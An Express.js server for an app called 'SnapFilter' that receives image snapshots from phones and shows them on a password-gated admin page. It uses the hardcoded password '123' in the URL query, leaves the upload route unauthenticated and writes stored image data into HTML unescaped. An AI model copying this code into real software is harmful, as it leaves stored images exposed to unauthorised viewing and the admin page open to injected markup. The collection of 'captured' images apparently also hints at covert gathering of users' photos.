const express = require('express');
const path = require('path');
const app = express();

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// مصفوفة مؤقتة في الذاكرة لتخزين وعرض جميع الصور الملتقطة لحظياً
let storedImages = [];

// مسار استقبال الصورة من الموبايل
app.post('/upload-snapshot', (req, res) => {
    const imageData = req.body.image;
    if (!imageData) {
        return res.status(400).json({ success: false, error: 'No image data' });
    }

    try {
        const newImage = {
            id: Date.now(),
            data: imageData,
            time: new Date().toLocaleString()
        };

        // إضافة الصورة الجديدة في بداية القائمة لتظهر أولاً في الـ Admin
        storedImages.unshift(newImage);

        // الاحتفاظ بأحدث 50 صورة فقط لضمان سرعة الخادم
        if (storedImages.length > 50) {
            storedImages.pop();
        }

        res.json({ success: true });
    } catch (e) {
        console.error(e);
        res.status(500).json({ success: false, error: 'Failed to save' });
    }
});

// مسار لوحة التحكم لعرض الصور مباشرة
app.get('/admin', (req, res) => {
    const password = req.query.pass;
    if (password !== '123') {
        return res.send(`
            <form method="GET" action="/admin" style="text-align:center; margin-top:80px; font-family:sans-serif;">
                <h2>لوحة تحكم مشروعي - SnapFilter</h2>
                <input type="password" name="pass" placeholder="كلمة المرور" style="padding:10px; font-size:16px;" required />
                <button type="submit" style="padding:10px 20px; font-size:16px; background:#007bff; color:white; border:none;">دخول</button>
            </form>
        `);
    }

    let imagesHtml = storedImages.map(img => `
        <div style="display:inline-block; margin:15px; text-align:center; background:#f9f9f9; padding:10px; border-radius:8px; border:1px solid #ddd;">
            <img src="${img.data}" width="220" style="border-radius:6px;" /><br>
            <small style="color:#666; display:block; margin-top:5px;">${img.time}</small>
        </div>
    `).join('');

    res.send(`
        <div style="font-family:sans-serif; padding:20px; text-align:center;">
            <h2>الصور الملتقطة عبر SnapFilter</h2>
            <a href="/admin" style="color:red; text-decoration:none; font-weight:bold;">تسجيل خروج</a>
            <hr style="margin:20px 0;">
            <div style="display:flex; flex-wrap:wrap; justify-content:center;">
                ${imagesHtml || '<p style="color:#777; font-size:18px;">لا توجد صور ملتقطة حتى الآن.</p>'}
            </div>
        </div>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});